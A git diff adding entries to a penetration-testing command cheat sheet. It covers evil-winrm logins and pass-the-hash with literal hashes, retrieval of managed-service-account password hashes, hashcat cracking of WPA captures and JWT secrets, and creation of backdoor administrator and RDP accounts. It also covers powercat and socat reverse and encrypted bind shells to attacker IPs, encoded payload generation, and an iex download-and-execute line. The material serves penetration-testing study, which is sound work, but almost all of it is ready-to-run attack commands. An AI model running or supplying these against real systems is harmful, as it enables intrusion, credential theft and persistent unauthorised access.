@@ -1077,6 +1077,50 @@ cd cheatsheet-pentesting
 ---
 
 ### evil-winrm
+- **Start Evil-WinRM Session/Logging Into a WinRM Session**:
+  ```bash
+  evil-winrm -i <target-ip> -u <username> -p <password>
+  ./evil-winrm.rb -i 192.168.50.80 -u tester -p password
+  ```
+
+- **Execute Command on Target Machine:**:
+  ```bash
+  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
+  ```
+- **Accessing Home Directory with PowerShell Scripts**:
+  ```bash
+  evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
+  ```
+  The -s . argument specifies that the PowerShell scripts in the user's home directory should be accessed.
+
+- **Pass-the-Hash (PTH) Authentication**:
+  ```bash
+  evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
+  evil-winrm -u tester -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.205.59
+  ```
+- **Post-Enumeration with Active Directory Module**:
+  ```bash
+  *Evil-WinRM* PS C:\Users\tester\Desktop> Import-Module ActiveDirectory
+  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADPrincipalGroupMembership svc_apache$ | select name
+  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADPrincipalGroupMembership enox | select name
+  ```
+
+- **Inspecting Group Managed Service Accounts (gMSA)**:
+  ```bash
+  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
+  ```
+- **Retrieving a Password hash**:
+  ```bash
+  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+  *Evil-WinRM* PS C:\Users\tester\Desktop> $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+  *Evil-WinRM* PS C:\Users\tester\Desktop> $mp = $gmsa.'msDS-ManagedPassword'
+  *Evil-WinRM* PS C:\Users\tester\Desktop> $mp
+  ```
+
+- **Execute Command on Target Machine**:
+  ```bash
+  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
+  ```
 - **Start Evil-WinRM Session**:
   ```bash
   evil-winrm -i <target-ip> -u <username> -p <password>
@@ -1280,8 +1324,9 @@ cd cheatsheet-pentesting
   ```
 ---
 ### Hashcat
-- **Start Hashcat with a Wordlist**:
+- **Installing hashcat-utils & Start Hashcat with a Wordlist**:
   ```bash
+  sudo apt install hashcat-utils
   hashcat -m <hash_type> <hash_file> <wordlist>
   ```
 
@@ -1294,6 +1339,27 @@ cd cheatsheet-pentesting
   ```bash
   hashcat --session <session_name> --restore
   ```
+- **Displaying properties of a Skylake CPU with hashcat:**:
+  ```bash
+  hashcat -I
+  ```
+
+- **Benchmarking the Skylake CPU with hashcat:**:
+  ```bash
+  hashcat --help
+  hashcat -b -m 2500
+  ```
+- **Converting a PCAP file to a .hccapx file for hashcat and Cracking it**:
+  ```bash
+  /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
+  hashcat -m 2500 output.hccapx /usr/share/john/password.lst
+  ```
+  The -m 2500 flag specifies the hash type (WPA/WPA2)
+- **Bruteforce JWT secret key**:
+  ```bash
+  hashcat -a 0 -m 16500 <JWT-token> JWT-Commom-Secrets
+  ```
+
 ---
 ### Host
 - **Lookup an IP Address for a Hostname**:
@@ -1862,6 +1928,50 @@ cd cheatsheet-pentesting
   ```cmd
   net stop <service_name>
   ```
+- **Creating a New User:**:
+  ```cmd
+  net user /add tester password
+  ```
+
+- **Listing Local Groups:**:
+  ```cmd
+  net localgroup
+  ```
+- **Adding User to Administrators Group:**:
+  ```cmd
+  net localgroup Administrators tester /add
+  ```
+
+- **Removing User from Administrators Group:**:
+  ```cmd
+  net localgroup Administrators tester /del
+  ```
+- **Listing Account Policies:**:
+  ```cmd
+  net accounts
+  ```
+
+- **Accessing Shared Network Resource:**:
+  ```cmd
+  net use \\192.168.1.1\public
+  ```
+- **Stopping and Starting Windows Search Service:**:
+  ```cmd
+  net stop WSearch
+  net start WSearch
+  ```
+
+- **Changing User Password:**:
+  ```cmd
+  net user admin Ev!lpass
+  ```
+- **Post Exploitation: Adding a New User to RDP and admin group:**:
+  ```cmd
+  net user test-user tester /add
+  net localgroup administrators /add tester
+  net localgroup "Remote Desktop Users" /add tester
+  ```
+
 ---
 ### Netsh
 - **Show Wireless Profiles**:
@@ -2073,6 +2183,37 @@ cd cheatsheet-pentesting
   ```powershell
   powercat -c <host> -p <port> -i <file>
   ```
+- **File Transfer with Powercat:**:
+  ```powershell
+  powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+  sudo nc -lnvp 443 > receiving_powercat.ps1
+  ```
+
+- **Reverse Shell with Powercat:**:
+  ```powershell
+  powercat -c 10.11.0.4 -p 443 -e cmd.exe
+  sudo nc -lvp 443
+  ```
+- **Bind Shell with Powercat:**:
+  ```powershell
+  powercat -l -p 443 -e cmd.exe
+  nc 10.11.0.22 443
+  ```
+
+- **Generating Powercat Stand-Alone Payloads:**:
+  ```powershell
+  powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+  ./reverseshell.ps1
+  ```
+- **Creating an Encoded Stand-Alone Payload:**:
+  ```powershell
+  powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+  ```
+- **Executing an Encoded Stand-Alone Payload:**:
+  ```powershell
+  powershell.exe -E <Encoded-Payload>
+  ./reverseshell.ps1
+  ```
 
 ### PowerShell
 - **Run a Script**:
@@ -2084,6 +2225,11 @@ cd cheatsheet-pentesting
   ```powershell
   powershell -Command "<command>"
   ```
+- **Download Tools(Powercat) using PowerShell**:
+  ```powershell
+  iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+  ```
+  iex executes the downloaded PowerShell script.
 ---
 ### PsExec
 - **Execute a Command on a Remote Host**:
@@ -2570,14 +2716,48 @@ cd cheatsheet-pentesting
   ```
 
 ### Socat
+- **Connecting to a Remote Server on Port 80**:
+  ```bash
+  socat - TCP4:<remote server's ip address>:80
+  ```
+
+- **Creating a Listener**:
+  ```bash
+  sudo socat TCP4-LISTEN:443 STDOUT
+  ```
 - **Create a Reverse Shell**:
   ```bash
   socat TCP:<target_host>:<port> EXEC:/bin/bash
+  socat -d -d TCP4-LISTEN:443 STDOUT
+  ```
+- **Sending a Reverse Shell**:
+  ```bash
+  socat TCP4:10.11.0.22:443 EXEC:/bin/bash
   ```
 
 - **Forward a Port**:
   ```bash
   socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
+  ```
+- **Transferring a File**:
+  ```bash
+  sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+  socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+  ```
+
+- **Setting Up Encrypted Shells**:
+  ```bash
+  openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
+  cat bind_shell.key bind_shell.crt > bind_shell.pem
+  ```
+- **Creating Encrypted Bind Shell**:
+  ```bash
+  sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+  ```
+
+- **Connecting to the Encrypted Bind Shell**:
+  ```bash
+  socat - OPENSSL:192.168.22.31:443,verify=0 id
   ```
 
 ### Spose
